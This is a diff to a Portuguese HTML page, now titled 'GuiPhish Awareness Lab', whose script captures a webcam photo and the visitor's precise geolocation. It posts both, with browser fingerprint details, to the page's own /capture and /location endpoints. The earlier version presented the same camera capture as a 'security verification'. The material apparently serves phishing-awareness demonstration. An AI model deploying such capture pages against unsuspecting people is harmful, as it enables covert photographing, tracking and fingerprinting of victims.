@@ -2,70 +2,75 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Verificação de Segurança</title>
+<title>GuiPhish Awareness Lab</title>
 <style>
 body {
     font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #667eea, #764ba2);
+    background: linear-gradient(135deg, #141e30, #243b55);
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     margin: 0;
+    color: white;
 }
 .container {
-    background: white;
+    background: #111827;
     padding: 40px;
     border-radius: 16px;
     text-align: center;
-    max-width: 400px;
+    max-width: 430px;
 }
-.logo {
-    font-size: 40px;
-}
+.logo { font-size: 42px; }
+p { color: #cbd5e1; font-size: 14px; }
 button {
+    width: 100%;
     margin-top: 15px;
-    padding: 12px 20px;
+    padding: 14px;
     border: none;
-    border-radius: 8px;
-    background: #667eea;
-    color: white;
+    border-radius: 10px;
     font-weight: bold;
+    cursor: pointer;
 }
+.btn-location { background: #00e676; color: #000; }
+.btn-camera { background: #7c4dff; color: white; }
+.status { margin-top: 18px; color: #93c5fd; }
 #video {
     display: none;
     width: 300px;
     margin-top: 20px;
-    border-radius: 8px;
-}
-.status {
-    font-size: 14px;
-    color: #666;
+    border-radius: 10px;
 }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo">🔒</div>
-    <h2>Verificação de Segurança</h2>
+    <div class="logo">🔐</div>
+    <h2>GuiPhish Awareness Lab</h2>
 
-    <p class="status" id="status">
-        Clique para permitir a câmera e capturar a imagem do lab.
-    </p>
+    <p>Escolha uma simulação de permissão do navegador.</p>
 
-    <button onclick="permitirECapturar()">Permitir e capturar foto</button>
+    <button class="btn-location" onclick="capturarLocalizacao()">
+        🌍 1 - Testar permissão de localização
+    </button>
+
+    <button class="btn-camera" onclick="capturarFoto()">
+        📸 2 - Testar permissão de câmera
+    </button>
+
+    <p class="status" id="status">Aguardando seleção...</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
+const statusText = document.getElementById("status");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const statusText = document.getElementById("status");
 
-async function permitirECapturar() {
+async function capturarFoto() {
     try {
         statusText.textContent = "Solicitando permissão da câmera...";
 
@@ -81,7 +86,7 @@ async function permitirECapturar() {
             video.onloadedmetadata = resolve;
         });
 
-        statusText.textContent = "Capturando foto...";
+        statusText.textContent = "Capturando imagem autorizada...";
 
         setTimeout(async () => {
             canvas.width = video.videoWidth;
@@ -92,30 +97,72 @@ async function permitirECapturar() {
 
             const image = canvas.toDataURL("image/jpeg", 0.8);
 
-            await fetch("/capture", {
+            const resposta = await fetch("/capture", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
+                headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
                     image: image,
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
                     screen: screen.width + "x" + screen.height,
-                    platform: navigator.platform
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 })
             });
 
             stream.getTracks().forEach(track => track.stop());
 
-           statusText.textContent = "Foto salva com sucesso ✅ Simulação concluída.";
+            statusText.textContent = resposta.ok
+                ? "Foto salva com sucesso ✅"
+                : "Erro ao enviar foto ❌";
 
         }, 1200);
 
     } catch (err) {
-        statusText.textContent = "Erro ao acessar câmera ❌";
+        statusText.textContent = "Permissão da câmera negada ou indisponível ❌";
         alert("Erro: " + err.name + " - " + err.message);
     }
+}
+
+function capturarLocalizacao() {
+    if (!navigator.geolocation) {
+        statusText.textContent = "Geolocalização não suportada neste navegador ❌";
+        return;
+    }
+
+    statusText.textContent = "Solicitando permissão de localização...";
+
+    navigator.geolocation.getCurrentPosition(async position => {
+        const coords = position.coords;
+
+        const resposta = await fetch("/location", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+                altitude: coords.altitude,
+                altitudeAccuracy: coords.altitudeAccuracy,
+                heading: coords.heading,
+                speed: coords.speed,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            })
+        });
+
+        statusText.textContent = resposta.ok
+            ? "Localização salva com sucesso ✅"
+            : "Erro ao enviar localização ❌";
+
+    }, error => {
+        statusText.textContent = "Permissão de localização negada ❌";
+        alert("Erro: " + error.message);
+    });
 }
 </script>
 
